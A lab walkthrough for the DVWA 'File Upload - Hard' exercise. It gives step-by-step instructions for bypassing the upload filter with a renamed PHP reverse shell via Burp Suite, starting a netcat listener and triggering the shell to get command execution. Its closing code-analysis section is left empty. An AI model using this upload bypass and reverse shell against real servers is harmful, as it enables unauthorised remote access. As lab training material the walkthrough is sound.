# File Upload - Hard

---

## Attack Steps

1. Open Burp Suite

    - Start a **temporary project**

2. Navigate to the proxy tab
    - Shortcut `CTRL + SHIFT + P`

3. Ensure the intercept is OFF 
    - Open the chromium browser

4. Navigate to DVWA and set difficulty to hard 

    - http://<ip address>/dvwa
    - Login
    ```bash 
    admin
    password
    ```
    - Navigate to DVWA Security on the left menu 
    - Set security level to hard

5. Navigate to the target webpage 
    - http://<ip address>/dvwa/vulnerabilites/upload

6. Make a copy of `php_reverse_shell.php` and save as a jpg file:

    - `CTRL + ATL + T` to open a terminal 

    ```bash 
    sudo cp /usr/share/webshells/php/php_reverse_shell.php php_reverse_shell.jpg
    ```

7. Prepare for upload:
    
    - Return to target page
    - Browse for `php_reverse_shell.jpg`
    - Select file 
    - DO NOT UPLOAD 

8. Turn intercept on 

    - On Burp Suite turn the intercept on to catch request

9. Upload file:

    - Request will be caught by Burp

10. Edit request in Burp Proxy: 
    
    - Scroll down to filename
    - Change from
    ```bash 
    filename="php_reverse_shell.jpg"
    ```
    - to:
    ```bash 
    filename="php_reverse_shell.php.jpg"
    ```
    
11. Forward the request

    - Turn intercept off

12. On the kali terminal start a listener 

    ```bash 
    nc -lvnp 1234 # If you changed the port number in the webshell file then change it here 
    # l - listener mode
    # v - verbose output 
    # n - skip DNS resolution (faster) 
    # p <port number> - Listen on port number assigned # Change to your port number
    ```

13. Navigate to the uploaded webshell 

    - The uploaded file was saved to http://<ip address>/dvwa/hackable/upload/php-reverse-shell.php.jpg

    - Alternatively run `curl -s http://<ip address>/dvwa/hackable/upload/php-reverse-shell.php.jpg` in another terminal 

14. On the netcat listener look a connection
    
    - The should be output similar to the following 
    ```bash 
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    sh: no job control in this shell 
    sh-3.2$ 
    ```

    - We can now run commands on the DVWA machine

## Vulnerable Code Analysis


### File 
`/var/www/dvwa/vulnerabilities/upload/source/hard`

#### Key Vulnerability Points:

```php 

```

### Explanation
